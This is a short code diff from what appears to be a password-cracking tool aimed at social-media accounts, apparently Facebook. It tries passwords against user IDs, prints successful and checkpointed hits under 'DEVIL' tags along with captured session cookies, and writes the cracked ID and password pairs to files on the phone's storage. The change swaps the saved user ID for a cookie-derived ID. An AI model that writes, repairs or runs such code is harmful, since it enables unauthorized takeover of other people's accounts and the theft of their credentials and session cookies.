@@ -233,14 +233,14 @@ def rcrack1(uid,pwx,tl):
                 cid = coki[7:22]
                 print(f"\033[38;5;46m[DEVIL-OK] {uid} | {ps}")
                 print(f" Cookie : {coki}")
-                open('/sdcard/ok.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/ok.txt', 'a').write( cid+' | '+ps+'\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
                 print(f"\x1b[38;5;196m[DEVIL-CP] {cid} | {ps}")
-                open('/sdcard/cp.txt', 'a').write( uid+' | '+ps+' \n')
+                open('/sdcard/cp.txt', 'a').write( cid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
